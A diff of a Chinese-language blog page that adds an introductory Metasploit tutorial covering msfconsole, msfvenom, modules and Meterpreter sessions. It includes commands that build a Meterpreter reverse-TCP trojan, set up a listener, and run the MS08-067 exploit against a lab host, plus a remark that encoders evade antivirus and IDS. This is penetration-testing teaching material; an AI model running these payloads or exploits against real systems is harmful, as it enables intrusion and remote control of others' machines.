@@ -87,7 +87,7 @@
                         <input id="switch_default" type="checkbox" class="switch_default">
                         <label for="switch_default" class="toggleBtn"></label>
             </div>
-            <form id="gridea-search-form" data-update="1607955305320" action="/search/index.html">
+            <form id="gridea-search-form" data-update="1608970042865" action="/search/index.html">
                 <input class="search-input" autocomplete="off" spellcheck="false" name="q" autofocus="true" placeholder="Search...">
             </form>
         </div>
@@ -106,7 +106,7 @@
                         <!--zh-->
                         <a id="mobile-toggle-theme-zh" class="a zh">&nbsp;&#x6697;&#x9ED1;</a>
                     </div>
-                    <form id="gridea-search-form" data-update="1607955305320" action="/search/index.html">
+                    <form id="gridea-search-form" data-update="1608970042865" action="/search/index.html">
                         <input class="search-input" autocomplete="off" spellcheck="false" name="q" autofocus="true" placeholder="Search...">
                     </form>
                     <!--en-->
@@ -220,9 +220,9 @@
                                         </a>
                                         <span class="post-time">&#x65E5;&#x671F;: <a href="#">2020-12-06</a></span>
                                         <span class="post-readtime">&#x9605;&#x8BFB;&#x65F6;&#x95F4;:<a
-                                    href="#">0.0
+                                    href="#">6.0
                                     &#x5206;&#x949F;</a></span>
-                                        <span class="post-words">&#x5B57;&#x6570;:<a href="#">1</a></span>
+                                        <span class="post-words">&#x5B57;&#x6570;:<a href="#">1344</a></span>
                                         
                                                 阅读量:
                                                 <span data-hk-page="current"> - </span>
@@ -232,7 +232,203 @@
                         </header>
                         
                         <div class="post-content">
-                            <p>mark</p>
+                            <h2 id="前言">前言</h2>
+<p>Metesploit是协助安全工程师进行渗透的框架，简称为MSF（Metesploit-Framework）。</p>
+<p>Github开源地址：https://github.com/rapid7/metasploit-framework</p>
+<p>Linux下安装教程可参考Micro8师傅：<a href="https://github.com/Micropoor/Micro8/blob/master/msf%E7%9A%84%E5%89%8D%E7%94%9F%E4%BB%8A%E4%B8%96%EF%BC%88%E7%AC%AC%E4%B8%89%E5%8D%81%E4%B8%80%E8%AF%BE%EF%BC%89.pdf">msf的前生今世</a></p>
+<h3 id="用户接口">用户接口</h3>
+<p>Metasploit为它的基础功能提供了多个<code>接口</code>，包含终端、命令行和图形化界面等。除了接口外，<code>功能程序（utilities）</code>还提供了对Metasploit框架中内部功能的直接访问，这使功能程序对于渗透代码的开发，以及一些不需要整体框架的灵活性场景非常方便。</p>
+<h3 id="msf终端">MSF终端</h3>
+<p>MSF终端（msfconsole）是目前Metasploit框架中最流行的用户接口。它是最灵活、功能最丰富以及支持最好的接口，它提供了一站式接口，能够访问Metasploit框架中几乎每一个选项和配置。</p>
+<p>启用MSF终端（以kali为基础）：</p>
+<pre><code class="language-bash">kali@kali:~$ msfconsole
+</code></pre>
+<p>通过help+command即可访问MSF终端中的帮助文件，它对该命令进行详细的描述：</p>
+<pre><code class="language-bash">msf5 &gt; help connect
+</code></pre>
+<figure data-type="image" tabindex="1"><img src="https://zzggtt.github.io/post-images/1608969849784.png" alt="" loading="lazy"></figure>
+<h3 id="功能程序utilities">功能程序（utilities）</h3>
+<p>Metasploit的功能程序是在某些特定的场合下，对框架中的一些特殊功能进行直接访问的接口，在渗透代码的开放中特别有用。</p>
+<h4 id="攻击载荷生成器msfpayload">攻击载荷生成器（msfpayload）</h4>
+<p>msfpayload可以生成shellcode、可执行代码和其他更多的读写，也可以用于渗透代码中。</p>
+<p>shellcode可以生成包括C、JavaScript、甚至Web脚本在内的多种格式，每种输出各种在不同的场景使用。</p>
+<h4 id="编码器msfencoed">编码器（msfencoed）</h4>
+<p>在网络上明文传输shellcode时很容易被入侵检测系统和杀软所识别出来，为了解决这一问题，Metasploit提供了MSF编码器。</p>
+<p>它可以帮助你通过对原始payload进行编码的方式，来避免坏字符，以及bypass杀软和IDS的检测。</p>
+<h4 id="msfvenom">msfvenom</h4>
+<p>Msfvenom是有效负载生成和编码的结合。 它在2015年6月8日取代了msfpayload和msfencode。</p>
+<p>具体使用可参考：https://github.com/rapid7/metasploit-framework/wiki/How-to-use-msfvenom</p>
+<pre><code class="language-bash">Options:
+    -p, --payload       &lt;payload&gt;    Payload to use. Specify a '-' or stdin to use custom payloads
+        --payload-options            List the payload's standard options
+    -l, --list          [type]       List a module type. Options are: payloads, encoders, nops, all
+    -n, --nopsled       &lt;length&gt;     Prepend a nopsled of [length] size on to the payload
+    -f, --format        &lt;format&gt;     Output format (use --help-formats for a list)
+        --help-formats               List available formats
+    -e, --encoder       &lt;encoder&gt;    The encoder to use
+    -a, --arch          &lt;arch&gt;       The architecture to use
+        --platform      &lt;platform&gt;   The platform of the payload
+        --help-platforms             List available platforms
+    -s, --space         &lt;length&gt;     The maximum size of the resulting payload
+        --encoder-space &lt;length&gt;     The maximum size of the encoded payload (defaults to the -s value)
+    -b, --bad-chars     &lt;list&gt;       The list of characters to avoid example: '\x00\xff'
+    -i, --iterations    &lt;count&gt;      The number of times to encode the payload
+    -c, --add-code      &lt;path&gt;       Specify an additional win32 shellcode file to include
+    -x, --template      &lt;path&gt;       Specify a custom executable file to use as a template
+    -k, --keep                       Preserve the template behavior and inject the payload as a new thread
+    -o, --out           &lt;path&gt;       Save the payload
+    -v, --var-name      &lt;name&gt;       Specify a custom variable name to use for certain output formats
+        --smallest                   Generate the smallest possible payload
+    -h, --help                       Show this message
+</code></pre>
+<figure data-type="image" tabindex="2"><img src="https://zzggtt.github.io/post-images/1608969866317.png" alt="" loading="lazy"></figure>
+<p>以生成反弹shell为例进行演示：</p>
+<pre><code class="language-bash">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.213.128 LPORT=4444 -f exe &gt; shell.exe
+</code></pre>
+<pre><code class="language-bash">use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+set LHOST 192.168.213.128
+set LPORT 4444
+exploit
+</code></pre>
+<h2 id="模块-module">模块 module</h2>
+<p>Metasploit框架中包含了数百个模块，可以通过show命令来显示模块。</p>
+<pre><code class="language-bash">msf5 &gt; show
+</code></pre>
+<figure data-type="image" tabindex="3"><img src="https://zzggtt.github.io/post-images/1608969894151.png" alt="" loading="lazy"></figure>
+<p>还可以通过search命令来查找指定模块（以ms08-067为例）：</p>
+<pre><code class="language-bash">msf5 &gt; search ms08-067
+</code></pre>
+<p><img src="https://zzggtt.github.io/post-images/1608969901033.png" alt="" loading="lazy"><br>
+通过use命令来选择模块：</p>
+<pre><code class="language-bash">msf5 &gt; use exploit/windows/smb/ms08_067_netapi
+</code></pre>
+<figure data-type="image" tabindex="4"><img src="https://zzggtt.github.io/post-images/1608969908940.png" alt="" loading="lazy"></figure>
+<p>当我们选择了一个模块后，可以通过show options来查看模块需要正确运行所需的设置：</p>
+<pre><code class="language-bash">msf5 exploit(windows/smb/ms08_067_netapi) &gt; show options
+
+</code></pre>
+<figure data-type="image" tabindex="5"><img src="https://zzggtt.github.io/post-images/1608969915798.png" alt="" loading="lazy"></figure>
+<p>options由三部分组成：</p>
+<ul>
+<li>
+<p>Payload options</p>
+<p>该模块下需要先选择payload，show payloads 命令来查看可选payload：</p>
+<pre><code class="language-bash">msf5 exploit(windows/smb/ms08_067_netapi) &gt; show payloads
+</code></pre>
+</li>
+</ul>
+<figure data-type="image" tabindex="6"><img src="https://zzggtt.github.io/post-images/1608969922506.png" alt="" loading="lazy"></figure>
+<p>然后通过set命令来选择payload：</p>
+<pre><code class="language-bash">msf5 exploit(windows/smb/ms08_067_netapi) &gt; set payload windows/shell/reverse_tcp
+</code></pre>
+<figure data-type="image" tabindex="7"><img src="https://zzggtt.github.io/post-images/1608969928673.png" alt="" loading="lazy"></figure>
+<ul>
+<li>
+<p>Module options</p>
+<p>在选择了payload后，就可以进行module options的具体设置。</p>
+<pre><code class="language-bash">set RHOSTS 192.168.52.1
+</code></pre>
+</li>
+</ul>
+<figure data-type="image" tabindex="8"><img src="https://zzggtt.github.io/post-images/1608969934868.png" alt="" loading="lazy"></figure>
+<ul>
+<li>
+<p>Exploit target</p>
+<p>show target命令可以列出受漏洞影响的目标系统类型：</p>
+<pre><code class="language-bash">msf5 exploit(windows/smb/ms08_067_netapi) &gt; show targets
+</code></pre>
+</li>
+</ul>
+<figure data-type="image" tabindex="9"><img src="https://zzggtt.github.io/post-images/1608969941149.png" alt="" loading="lazy"></figure>
+<p>默认情况下，target选择为编号0：</p>
+<figure data-type="image" tabindex="10"><img src="https://zzggtt.github.io/post-images/1608969947071.png" alt="" loading="lazy"></figure>
+<p>可以通过set 命令来修改：</p>
+<pre><code class="language-bash">msf5 exploit(windows/smb/ms08_067_netapi) &gt; set target 1
+</code></pre>
+<figure data-type="image" tabindex="11"><img src="https://zzggtt.github.io/post-images/1608969951974.png" alt="" loading="lazy"></figure>
+<p>最后通过run/exploit命令来执行。</p>
+<h2 id="会话-meterpreter">会话 Meterpreter</h2>
+<p>Meterpreter是MSF的一个扩展模块，可以调用MSF的一些功能，对目标系统进行更深的渗透，包括：读取密码hash、提权、跳板攻击等等。</p>
+<p>首先通过msfvenom生成木马：</p>
+<pre><code class="language-bash">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.213.128 LPORT=4444 -f exe &gt; shell.exe
+</code></pre>
+<p>然后在本机进行监听：</p>
+<pre><code class="language-bash">use exploit/multi/handler
+
+set payload windows/meterpreter/reverse_tcp
+
+set LHOST 192.168.213.128
+
+set LPORT 4444
+
+exploit
+</code></pre>
+<p>当木马在目标机器被执行后，会返回一个Meterpreter会话：</p>
+<figure data-type="image" tabindex="12"><img src="https://zzggtt.github.io/post-images/1608969959490.png" alt="" loading="lazy"></figure>
+<p>通过该会话，就能获取一个目标系统上的Meterpreter Shell。</p>
+<h3 id="参数">参数</h3>
+<p>通过help参数可以查看Meterpreter的功能。</p>
+<pre><code class="language-bash">meterpreter &gt; help
+</code></pre>
+<ul>
+<li>
+<p>Core Commands<br>
+<img src="https://zzggtt.github.io/post-images/1608969965181.png" alt="" loading="lazy"></p>
+</li>
+<li>
+<p>File system Commands</p>
+</li>
+</ul>
+<figure data-type="image" tabindex="13"><img src="https://zzggtt.github.io/post-images/1608969970790.png" alt="" loading="lazy"></figure>
+<ul>
+<li>Networking Commands</li>
+</ul>
+<figure data-type="image" tabindex="14"><img src="https://zzggtt.github.io/post-images/1608969975891.png" alt="" loading="lazy"></figure>
+<ul>
+<li>System Commands</li>
+</ul>
+<figure data-type="image" tabindex="15"><img src="https://zzggtt.github.io/post-images/1608969980533.png" alt="" loading="lazy"></figure>
+<ul>
+<li>User interface Commands</li>
+</ul>
+<figure data-type="image" tabindex="16"><img src="https://zzggtt.github.io/post-images/1608969985664.png" alt="" loading="lazy"></figure>
+<ul>
+<li>Webcam Commands</li>
+</ul>
+<figure data-type="image" tabindex="17"><img src="https://zzggtt.github.io/post-images/1608969992562.png" alt="" loading="lazy"></figure>
+<ul>
+<li>Others</li>
+</ul>
+<figure data-type="image" tabindex="18"><img src="https://zzggtt.github.io/post-images/1608969997322.png" alt="" loading="lazy"></figure>
+<h3 id="background">background</h3>
+<p>通过background命令可以把当前meterpreter会话挂起在后台：</p>
+<pre><code class="language-bash">background
+</code></pre>
+<figure data-type="image" tabindex="19"><img src="https://zzggtt.github.io/post-images/1608970002478.png" alt="" loading="lazy"></figure>
+<h3 id="session">session</h3>
+<ul>
+<li>
+<p><code>查看会话</code></p>
+<p>如果对多个目标进行了攻击，会同时开启多个会话，通过session -l命令可以查看Meterpreter的情况：</p>
+<pre><code class="language-bash">sessions -l
+</code></pre>
+</li>
+</ul>
+<figure data-type="image" tabindex="20"><img src="https://zzggtt.github.io/post-images/1608970009014.png" alt="" loading="lazy"></figure>
+<p>如果想查看会话的详细信息，可以通过命令：</p>
+<pre><code class="language-bash">sessions -l -v
+</code></pre>
+<figure data-type="image" tabindex="21"><img src="https://zzggtt.github.io/post-images/1608970013557.png" alt="" loading="lazy"></figure>
+<ul>
+<li>
+<p><code>会话交互：</code></p>
+<p>通过以下命令，可以与不同id的session进行交互：</p>
+<pre><code class="language-bash">sessions -i 1
+</code></pre>
+</li>
+</ul>
+<figure data-type="image" tabindex="22"><img src="https://zzggtt.github.io/post-images/1608970017908.png" alt="" loading="lazy"></figure>
 
                         </div>
                         
@@ -263,8 +459,8 @@
                         <i class="post-share"></i>
                         <span>&#x5206;&#x4EAB;:</span>
                                                                     <a title="QR 码" target="_blank" href="https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=https://zzggtt.github.io/post/shen-tou-gong-ju-msf-ji-chu-shi-yong/"><i class="fa fa-qrcode"></i></a>
-                                                                    <a title="QQ" target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=https://zzggtt.github.io/post/shen-tou-gong-ju-msf-ji-chu-shi-yong/&sharesource=qzone&title=渗透工具-MSF基础使用&pics=https://zzggtt.github.io/images/avatar.png?v=1607955305320&summary="><i class="fa fa-qq"></i></a>
-                                                                    <a title="新浪微博" target="_blank" href="https://service.weibo.com/share/share.php?url=https://zzggtt.github.io/post/shen-tou-gong-ju-msf-ji-chu-shi-yong/&sharesource=weibo&title=渗透工具-MSF基础使用 + " - " + &pic="https://zzggtt.github.io/images/avatar.png?v=1607955305320 "><i class="fa fa-weibo "></i></a>
+                                                                    <a title="QQ" target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=https://zzggtt.github.io/post/shen-tou-gong-ju-msf-ji-chu-shi-yong/&sharesource=qzone&title=渗透工具-MSF基础使用&pics=https://zzggtt.github.io/images/avatar.png?v=1608970042865&summary="><i class="fa fa-qq"></i></a>
+                                                                    <a title="新浪微博" target="_blank" href="https://service.weibo.com/share/share.php?url=https://zzggtt.github.io/post/shen-tou-gong-ju-msf-ji-chu-shi-yong/&sharesource=weibo&title=渗透工具-MSF基础使用 + " - " + &pic="https://zzggtt.github.io/images/avatar.png?v=1608970042865 "><i class="fa fa-weibo "></i></a>
 
                                                                     </span>
                                                                     
@@ -288,10 +484,6 @@
                                                                                 <!---->
                                                                                 <section class="post-nav">
                                                                                     
-                                                                                        <a class="prev" rel="prev" href="https://zzggtt.github.io/post/yu-ren-zheng-kerbros/">
-                                                                                            域认证-Kerbros
-                                                                                        </a>
-                                                                                        
                                                                                             
                                                                                                 <a class="next" rel="next" href="https://zzggtt.github.io/post/cong-mimkatz-xue-xi-windows-ben-di-hash-zhua-qu/">
                                                                                                     从mimkatz学习Windows本地hash抓取
@@ -385,7 +577,7 @@
                     CheckVersion();
                     
                     var newDate = new Date();
-                    newDate.setTime(1607955305320);
+                    newDate.setTime(1608970042865);
                     console.log(" Blog Update Time: " + newDate.toLocaleDateString());
                     console.log("\n %c \u26a1Theme:Chic Author's Blog:https://blog.itjoker.cn  Write By ITJoker  \n\n", "color: #ffffff; background: rgba(49, 49, 49, 0.85); padding:5px 0;border-radius:5px;");
                 </script>
